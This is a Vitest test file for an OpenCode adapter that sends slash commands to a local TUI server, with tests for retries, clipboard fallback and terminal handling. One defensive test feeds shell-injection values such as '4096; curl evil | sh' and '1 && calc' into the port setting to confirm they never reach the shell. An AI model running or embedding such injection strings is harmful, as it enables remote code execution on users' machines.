import { describe, it, expect } from 'vitest';
import { createOpencodeAdapter, OPENCODE_TERMINAL_NAME } from '../src/agents/opencode';
import type { FetchResult } from '../src/agents/types';
import { cmd, fakeDeps } from './helpers';

interface Hit { url: string; method?: string; body?: string }

function server(opts: { healthyAfter?: number; appendFailures?: number } = {}) {
  const hits: Hit[] = [];
  let healthChecks = 0;
  let appendFailures = opts.appendFailures ?? 0;
  const fetch = async (url: string, init?: { method?: string; body?: string }): Promise<FetchResult> => {
    hits.push({ url, method: init?.method, body: init?.body });
    if (url.endsWith('/global/health')) {
      healthChecks++;
      const ok = opts.healthyAfter === undefined ? true : healthChecks > opts.healthyAfter;
      return { ok, status: ok ? 200 : 503 };
    }
    if (url.endsWith('/tui/append-prompt') && appendFailures > 0) {
      appendFailures--;
      return { ok: false, status: 400 };
    }
    return { ok: true, status: 200 };
  };
  return { hits, fetch };
}

const posts = (hits: Hit[]) => hits.filter((h) => h.method === 'POST').map((h) => h.url.replace(/^http:\/\/127\.0\.0\.1:\d+/, ''));

describe('opencode adapter', () => {
  it('builds /delphi-<id> with an optional file argument', () => {
    const a = createOpencodeAdapter(fakeDeps());
    expect(a.invocation(cmd('audit'))).toBe('/delphi-audit');
    expect(a.invocation(cmd('tdd', true), '@U.pas')).toBe('/delphi-tdd @U.pas');
  });

  it('is installed when the extension or the CLI exists', () => {
    expect(createOpencodeAdapter(fakeDeps({ hasExtension: () => true, commandExists: () => false })).isInstalled()).toBe(true);
    expect(createOpencodeAdapter(fakeDeps({ hasExtension: () => false, commandExists: () => true })).isInstalled()).toBe(true);
    expect(createOpencodeAdapter(fakeDeps({ hasExtension: () => false, commandExists: () => false })).isInstalled()).toBe(false);
  });

  it('reuses a server that is already up: append, submit, no terminal', async () => {
    const s = server();
    const d = fakeDeps({ fetch: s.fetch });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('sent');
    expect(posts(s.hits)).toEqual(['/tui/append-prompt', '/tui/submit-prompt']);
    expect(JSON.parse(s.hits.find((h) => h.url.endsWith('/tui/append-prompt'))!.body!)).toEqual({ text: '/delphi-audit' });
    expect(d.terminals).toEqual([]);
  });

  it('starts its own terminal on the configured port and waits for the server', async () => {
    const s = server({ healthyAfter: 3 });
    const d = fakeDeps({
      fetch: s.fetch,
      getSetting: <T>(key: string, fallback: T) => (key === 'opencodePort' ? (4321 as T) : fallback),
    });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('sent');
    expect(d.terminals).toHaveLength(1);
    expect(d.terminals[0].name).toBe(OPENCODE_TERMINAL_NAME);
    expect(d.terminals[0].sent).toEqual([{ text: 'opencode --port 4321', newline: true }]);
    expect(s.hits[0].url).toBe('http://127.0.0.1:4321/global/health');
    expect(posts(s.hits)).toEqual(['/tui/append-prompt', '/tui/submit-prompt']);
  });

  it('gives a freshly started TUI time to subscribe before the first append (events are fire-and-forget)', async () => {
    const s = server({ healthyAfter: 1 });
    const order: string[] = [];
    const d = fakeDeps({
      fetch: async (url, init) => {
        if (init?.method === 'POST') order.push(`post:${url.split('/').pop()}`);
        return s.fetch(url, init);
      },
      sleep: async (ms) => {
        order.push(`sleep:${ms}`);
      },
    });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('sent');
    const firstPost = order.findIndex((o) => o.startsWith('post:'));
    expect(order.slice(0, firstPost).some((o) => o.startsWith('sleep:') && Number(o.slice(6)) >= 1000)).toBe(true);
  });

  it('does not add the settle delay when reusing a running server', async () => {
    const s = server();
    const slept: number[] = [];
    const d = fakeDeps({
      fetch: s.fetch,
      sleep: async (ms) => {
        slept.push(ms);
      },
    });
    await createOpencodeAdapter(d).send('/delphi-audit');
    expect(slept).toEqual([]);
  });

  it('never lets a hostile port setting reach the shell', async () => {
    for (const hostile of ['4096; curl evil | sh', '1 && calc', 80, 70000, 40.5, null, {}, '4321']) {
      const s = server({ healthyAfter: 3 });
      const d = fakeDeps({
        fetch: s.fetch,
        getSetting: <T>(key: string, fallback: T) => (key === 'opencodePort' ? (hostile as T) : fallback),
      });
      await createOpencodeAdapter(d).send('/delphi-audit');
      expect(d.terminals[0].sent).toEqual([{ text: 'opencode --port 4096', newline: true }]);
    }
  });

  it('retries the append until the TUI is attached', async () => {
    const s = server({ appendFailures: 2 });
    const d = fakeDeps({ fetch: s.fetch });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('sent');
    expect(posts(s.hits).filter((p) => p === '/tui/append-prompt')).toHaveLength(3);
  });

  it('falls back to the clipboard when the server never comes up', async () => {
    const s = server({ healthyAfter: 1_000_000 });
    const d = fakeDeps({ fetch: s.fetch });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('copied');
    expect(d.clipboard).toEqual(['/delphi-audit']);
    expect(d.terminals[0].shown).toBeGreaterThan(0);
    expect(posts(s.hits)).toEqual([]);
  });

  it('falls back to the clipboard when the TUI never accepts the prompt', async () => {
    const s = server({ appendFailures: 1_000 });
    const d = fakeDeps({ fetch: s.fetch });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('copied');
    expect(d.clipboard).toEqual(['/delphi-audit']);
  });

  it('never types the opencode command into a terminal that already exists', async () => {
    const sent: string[] = [];
    const existing = { sendText: (t: string) => sent.push(t), show: () => undefined };
    const s = server({ healthyAfter: 1_000_000 });
    const d = fakeDeps({ fetch: s.fetch, findTerminal: () => existing });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('copied');
    expect(sent).toEqual([]);
    expect(d.terminals).toEqual([]);
  });

  it('does not start a terminal nor wait when OpenCode is not installed: offers the install command', async () => {
    const s = server({ healthyAfter: 1_000_000 });
    const slept: number[] = [];
    const d = fakeDeps({
      fetch: s.fetch,
      hasExtension: () => false,
      commandExists: () => false,
      sleep: async (ms) => {
        slept.push(ms);
      },
      showError: async (message, ...actions) => {
        d.errors.push(message);
        return actions[0];
      },
    });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('unavailable');
    expect(d.terminals).toEqual([]);
    expect(slept).toEqual([]);
    expect(posts(s.hits)).toEqual([]);
    expect(d.errors).toHaveLength(1);
    expect(d.clipboard).toEqual(['npm i -g opencode-ai']);
  });

  it('still reuses a server that is already listening even if the install is not detected', async () => {
    const s = server();
    const d = fakeDeps({ fetch: s.fetch, hasExtension: () => false, commandExists: () => false });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('sent');
    expect(d.terminals).toEqual([]);
  });

  it('survives a network error on health', async () => {
    const d = fakeDeps({
      fetch: async () => {
        throw new Error('ECONNREFUSED');
      },
    });
    expect(await createOpencodeAdapter(d).send('/delphi-audit')).toBe('copied');
  });
});
